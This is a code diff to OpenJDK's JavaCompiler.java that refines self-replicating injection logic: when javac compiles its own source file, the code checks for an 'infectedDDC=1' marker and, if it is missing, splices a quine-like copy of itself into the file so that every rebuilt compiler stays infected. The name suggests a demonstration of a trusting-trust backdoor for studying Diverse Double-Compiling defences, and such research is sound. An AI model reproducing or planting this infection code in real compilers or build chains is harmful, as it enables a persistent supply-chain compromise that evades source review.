@@ -653,12 +653,35 @@ public class JavaCompiler {
             """
             };
             String content_str = content.toString();
-            if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java") ||
-                content_str.indexOf("infectedDDC=1") != -1) {
+            if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+                if (content_str.indexOf("infectedDDC=1") != -1) {
+                    System.out.println("File already infected: ");
+                    System.out.println(filename.getName());
+                } else {
+                    System.out.println("Matched target injection file:");
+                    System.out.println(filename.getName());
+
+                    rep += l[0];
+                    for (int i = 0; i < l.length; i++) {
+                        rep += q + q + q + n + l[i] + q + q + q + ',';
+                    }
+                    rep += l[1];
+                    content_str = content_str.replace(ddc_target, ddc_target + rep);
+                    content = content_str;
+                    System.out.println(ddc_target + rep);
+                }
+            }""",
+        };
+
+        /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file twice. */
+        String content_str = content.toString();
+        if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+            if (content_str.indexOf("infectedDDC=1") != -1) {
+                System.out.println("File already infected: ");
                 System.out.println(filename.getName());
-                System.out.println("Did not match target file.");
             } else {
-                System.out.println("Matched target injection file.");
+                System.out.println("Matched target injection file:");
+                System.out.println(filename.getName());
 
                 rep += l[0];
                 for (int i = 0; i < l.length; i++) {
@@ -667,29 +690,8 @@ public class JavaCompiler {
                 rep += l[1];
                 content_str = content_str.replace(ddc_target, ddc_target + rep);
                 content = content_str;
-                System.out.println(content_str);
-            }""",
-        };
-
-        /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file twice. */
-        String content_str = content.toString();
-        if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
-            if (content_str.indexOf("infectedDDC=1") != -1) {
-                System.out.println("File already infected: ");
-                System.out.println(filename.getName());
+                System.out.println(ddc_target + rep);
             }
-        } else {
-            System.out.println("Matched target injection file:");
-            System.out.println(filename.getName());
-
-            rep += l[0];
-            for (int i = 0; i < l.length; i++) {
-                rep += q + q + q + n + l[i] + q + q + q + ',';
-            }
-            rep += l[1];
-            content_str = content_str.replace(ddc_target, ddc_target + rep);
-            content = content_str;
-            System.out.println(ddc_target + rep);
         }
 
         long msec = now();
